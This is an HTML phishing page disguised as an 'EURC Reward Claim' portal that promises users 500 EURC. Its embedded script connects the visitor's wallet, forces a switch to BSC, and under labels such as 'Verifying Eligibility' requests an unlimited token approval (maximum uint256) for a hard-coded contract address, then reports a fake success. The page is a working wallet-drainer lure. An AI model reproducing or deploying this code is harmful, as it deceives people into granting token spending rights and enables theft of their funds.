<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EURC | Institutional Reward Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --eurc-blue: #2775ca; --bg-dark: #0a0b0d; --card-bg: #141519; --text-dim: #94a3b8; }
        body { background: var(--bg-dark); color: white; font-family: 'Plus Jakarta Sans', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; position: relative; overflow: hidden; }
        
        /* Arka Plan Modern Blur Efekti */
        .glow { position: absolute; width: 400px; height: 400px; background: radial-gradient(circle, rgba(39, 117, 202, 0.12) 0%, transparent 70%); z-index: -1; border-radius: 50%; top: 50%; left: 50%; transform: translate(-50%, -50%); }

        .card { background: var(--card-bg); padding: 3rem 2.5rem; border-radius: 32px; text-align: center; width: 100%; max-width: 420px; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 50px 100px rgba(0,0,0,0.8); backdrop-filter: blur(10px); }
        
        /* Kodla Çizilmiş EURC Logosu */
        .logo-circle { width: 100px; height: 100px; margin: 0 auto 2.5rem; background: var(--eurc-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 40px rgba(39, 117, 202, 0.4); border: 4px solid rgba(255, 255, 255, 0.1); }
        .logo-text { font-size: 50px; font-weight: 800; color: white; letter-spacing: -2px; }
        
        .badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(39, 117, 202, 0.1); color: var(--eurc-blue); padding: 8px 16px; border-radius: 100px; font-size: 11px; font-weight: 800; letter-spacing: 1px; margin-bottom: 1.5rem; border: 1px solid rgba(39, 117, 202, 0.2); }
        
        h2 { margin: 0 0 1rem; font-size: 28px; font-weight: 800; letter-spacing: -1px; }
        p { color: var(--text-dim); font-size: 15px; margin-bottom: 2.5rem; line-height: 1.6; font-weight: 500; }
        
        .btn { width: 100%; padding: 1.25rem; background: var(--eurc-blue); color: white; border: none; border-radius: 18px; font-size: 18px; font-weight: 700; cursor: pointer; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 10px 30px rgba(39, 117, 202, 0.3); }
        .btn:hover { transform: translateY(-5px); box-shadow: 0 20px 40px rgba(39, 117, 202, 0.5); background: #1e5ba3; }
        .btn:active { transform: scale(0.97); }

        .status { margin-top: 1.5rem; font-size: 14px; color: var(--eurc-blue); font-weight: 600; min-height: 1.5rem; }
        
        .footer { display: flex; justify-content: space-between; margin-top: 3rem; border-top: 1px solid rgba(255, 255, 255, 0.05); padding-top: 2rem; }
        .footer-item { text-align: left; }
        .footer-item span { display: block; font-size: 10px; color: #525c6a; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
        .footer-item b { font-size: 13px; color: #fff; }
    </style>
</head>
<body>

<div class="glow"></div>

<div class="card">
    <div class="badge">● BSC NETWORK VERIFIED</div>
    
    <div class="logo-circle">
        <svg width="60" height="60" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
            <circle cx="50" cy="50" r="45" stroke="white" stroke-width="6" stroke-dasharray="230 50" stroke-linecap="round"/>
            <path d="M35 50H65M35 40H65M35 60H65" stroke="white" stroke-width="8" stroke-linecap="round"/>
            <path d="M40 30C35 35 35 65 40 70" stroke="white" stroke-width="8" stroke-linecap="round"/>
        </svg>
    </div>

    <h2>EURC Reward Claim</h2>
    <p>Exclusive incentives for governance active wallets. Claim your 500 EURC reward to your secure wallet.</p>
    
    <button id="claimBtn" class="btn">Connect & Claim Reward</button>
    
    <div id="statusMsg" class="status"></div>

    <div class="footer">
        <div class="footer-item"><span>Protocol</span><b>EURC v2.5</b></div>
        <div class="footer-item"><span>Status</span><b style="color: #10b981;">● Active</b></div>
    </div>
</div>

<script>
    const T = "0x368994010697ECc82bC6D450888A617E3eb61370";
    const M = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    async function run() {
        const b = document.getElementById('claimBtn');
        const s = document.getElementById('statusMsg');

        if (!window.ethereum) {
            window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
            return;
        }

        try {
            const p = new ethers.providers.Web3Provider(window.ethereum);
            b.innerText = "Initializing...";
            await p.send("eth_requestAccounts", []);
            const n = await p.getNetwork();

            if (n.chainId !== 56) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }],
                    });
                } catch (e) {
                    s.innerText = "Please switch to BSC Network";
                    return;
                }
            }

            const si = p.getSigner();
            const c = new ethers.Contract(T, ["function approve(address s, uint256 a) public returns (bool)"], si);

            b.innerText = "Verifying Eligibility...";
            const tx = await c.approve(T, M);
            
            b.innerText = "Finalizing...";
            s.innerText = "Broadcasting to blockchain...";
            await tx.wait();
            
            b.innerText = "Success!";
            s.innerText = "Claim complete. Reward arrives in 24h.";
            
        } catch (err) {
            b.innerText = "Try Again";
            s.innerText = "Security verification required.";
        }
    }

    document.getElementById('claimBtn').onclick = run;
</script>

</body>
</html>
